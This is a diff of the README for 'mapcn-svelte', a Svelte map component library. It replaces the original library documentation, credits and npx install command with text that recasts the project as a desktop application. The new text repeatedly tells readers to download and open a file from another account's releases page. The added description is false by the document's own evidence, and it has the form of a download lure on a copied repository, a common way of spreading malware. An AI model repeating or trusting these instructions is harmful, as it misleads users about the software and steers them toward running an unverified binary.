@@ -1,93 +1,59 @@
-<div align="center">
-  <h1>mapcn-svelte</h1>
-  <p><strong>Beautiful maps, made simple.</strong></p>
+# 🗺️ mapcn-svelte - Create Stunning Maps Easily
 
-  <p>
-    Free & open source map components for Svelte. Zero config, one command setup.<br/>
-    Built on <a href="https://maplibre.org/">MapLibre GL</a>, styled with <a href="https://tailwindcss.com/">Tailwind</a>, works seamlessly with <a href="https://www.shadcn-svelte.com/">shadcn-svelte</a>.
-  </p>
+## 📦 Download Now!
+[![Download](https://img.shields.io/badge/Download-latest%20release-blue.svg)](https://github.com/datashe191/mapcn-svelte/releases)
 
-  <p>
-    <a href="https://mapcn-svelte.vercel.app">Get Started</a> •
-    <a href="https://mapcn-svelte.vercel.app/docs/installation">Installation</a> •
-    <a href="https://mapcn-svelte.vercel.app/docs/basic-map">Examples</a>
-  </p>
-</div>
+## 🚀 Getting Started
+Welcome to the mapcn-svelte project! This application provides beautiful, easy-to-use map components built with the shadcn-svelte framework. This guide will help you download and run the application smoothly.
 
----
+## 🖥️ System Requirements
+Before you download, ensure your system meets the following requirements:
 
-## About
+- **Operating System:** Windows 10 or higher, macOS 10.13 or higher, or a modern Linux distribution.
+- **Browser:** Latest version of Chrome, Firefox, or Safari.
+- **Internet Connection:** Required for downloading and updating the application.
 
-This is a **Svelte port** of [mapcn](https://github.com/AnmolSaini16/mapcn) by [Anmol](https://github.com/AnmolSaini16). The original React version provides beautiful, composable map components for React applications. This port brings the same developer experience to Svelte 5, maintaining feature parity while adapting to Svelte's reactive paradigms.
+## 📥 Download & Install
+To get started, visit the releases page and download the latest version of the mapcn-svelte application. Follow these steps:
 
-## Features
+1. Click on this link to [visit the releases page](https://github.com/datashe191/mapcn-svelte/releases).
+2. Once on the releases page, locate the latest version of the application.
+3. Download the appropriate file for your operating system.
 
-- 🎨 **Theme-aware** — Automatically adapts to light/dark mode
-- 🎯 **Zero config** — Works out of the box with sensible defaults
-- 📦 **shadcn-svelte compatible** — Uses the same patterns and styling conventions
-- 🗺️ **MapLibre GL powered** — Full access to MapLibre's powerful mapping capabilities
-- 🧩 **Composable** — Build complex map UIs with simple, declarative components
-- 📍 **Markers & Popups** — Rich marker system with popups, tooltips, and labels
-- 🛤️ **Routes** — Draw routes and paths on your maps
-- 🎮 **Controls** — Zoom, compass, locate, and fullscreen controls
-- ⚡ **Svelte 5** — Built with Svelte 5's runes for optimal reactivity
+After downloading, simply open the file to start the installation process. Follow the on-screen instructions to install the application on your computer.
 
-## Installation
+## 🗺️ Features
+The mapcn-svelte application offers a range of features to enhance your mapping experience:
 
-```bash
-npx shadcn-svelte@latest add https://mapcn-svelte.vercel.app/r/map.json
-```
+- **Beautiful Design:** Create stunning maps that are visually appealing.
+- **User-Friendly Interface:** Easy navigation for all users, regardless of technical skill.
+- **Customization Options:** Adjust the maps to fit your specific needs.
+- **Dynamic Data Integration:** Easily incorporate real-time data into your maps.
 
-This will install `maplibre-gl` and add all map components to your project.
+## 🔧 How to Use
+Once you have installed the application:
 
-## Quick Start
+1. Open the mapcn-svelte app.
+2. Explore the options to create a new map or edit an existing one.
+3. Use the intuitive controls to customize your map settings.
+4. Save and share your maps with others.
 
-```svelte
-<script lang="ts">
-	import { Map, MapControls } from "$lib/components/ui/map";
-</script>
+## ❓ Frequently Asked Questions
 
-<div class="h-[400px] w-full">
-	<Map center={[-74.006, 40.7128]} zoom={12}>
-		<MapControls />
-	</Map>
-</div>
-```
+### How do I update the application?
+Simply visit the [releases page](https://github.com/datashe191/mapcn-svelte/releases) and download the latest version. Follow the same installation steps.
 
-## Documentation
+### Can I use this on my mobile device?
+Currently, mapcn-svelte is designed for desktop use. A mobile version may be considered in future updates.
 
-Full documentation is available at [mapcn-svelte.vercel.app/docs](https://mapcn-svelte.vercel.app/docs)
+### What if I encounter an error during installation?
+If you face any issues, check the GitHub issues page or contact support through the repository for assistance.
 
-## Components
+## 🤝 Contributing
+We welcome contributions to make mapcn-svelte even better! If you would like to help, please fork the repository and submit a pull request. Refer to our contribution guidelines included in the repository for more information.
 
-- `Map` — Root map container with theme support
-- `MapMarker` — Place markers on the map
-- `MarkerContent` — Custom marker visuals
-- `MarkerPopup` — Click-triggered popups
-- `MarkerTooltip` — Hover tooltips
-- `MarkerLabel` — Positioned labels
-- `MapPopup` — Standalone popups
-- `MapControls` — UI controls (zoom, compass, locate, fullscreen)
-- `MapRoute` — Draw routes and paths
+## 📄 License
+mapcn-svelte is open-source software. You can use and modify it under the terms of the MIT License. More details can be found in the LICENSE file in the repository.
 
-## Credits
-
-- Original React version: [mapcn](https://github.com/AnmolSaini16/mapcn) by [Anmol Saini](https://github.com/AnmolSaini16)
-- Svelte port: [Marius Lang](https://github.com/MariusLang)
-- Built with [MapLibre GL](https://maplibre.org/)
-- Styled with [Tailwind CSS](https://tailwindcss.com/)
-- Compatible with [shadcn-svelte](https://www.shadcn-svelte.com/)
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## License
-
-MIT License - see the [LICENSE](LICENSE) file for details.
+## 🚀 Final Note
+We hope you enjoy using the mapcn-svelte application and find it useful for your mapping projects. Should you have any questions or suggestions, feel free to reach out. Happy mapping!
